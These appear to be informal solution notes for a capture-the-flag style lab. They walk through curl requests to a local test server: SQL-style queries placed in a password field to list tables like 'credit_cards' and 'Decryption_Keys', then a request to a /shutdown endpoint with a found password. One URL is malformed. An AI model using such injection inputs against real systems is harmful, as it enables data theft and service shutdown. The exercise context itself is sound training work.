solution by the curl
ex1

curl -v -X POST http://localhost:5001/malwareinfo \
  -H "username: noor” \
  -d "password=supersecretshutdownpassword" \
  --output shrek.jpg


curl -v -X POST http://localhost:5001/malwareinfo \
  -H "username: noor" \
  -d "password=supersecretshutdownpassword" \
  --output shrek.jpg


ex2

=== WELCOME TO THE CASTLE ===

I am a magic sentence you send to the guard:
\"If the guard isn’t careful, they’ll give you the list of all rooms!\"

Hint: Think DB 
Use me wisely 😉.

=== END OF MESSAGE ===

curl -X POST http://localhost:5001/submit -d "Username=malak&Password=select * from information_schema.tables"



{
  "Available Tables": [
    "credit_cards",
    "Decryption_Keys",
    "Hitmen_for_hire"
  ]
}

ex3
curl -X POST http://10.1.204.53:5001/submit -d "Username=malak&Password=SELECT * FROM Decryption_Keys"

they should try all of the table to found the actual one 





ex4 try the 3 password that you have 

this is the right one

curl -X POST http://10.1.204.53:5001:5001/shutdown \
-H "username: malak" \
-d "password=supersecretkey"



curl -X POST http://localhost:5001/shutdown \
-H "username: malak" \
-d "password=supersecretkey"

curl -X POST -d "password=YOUR_PASSWORD" http://your-domain.com/shutdown
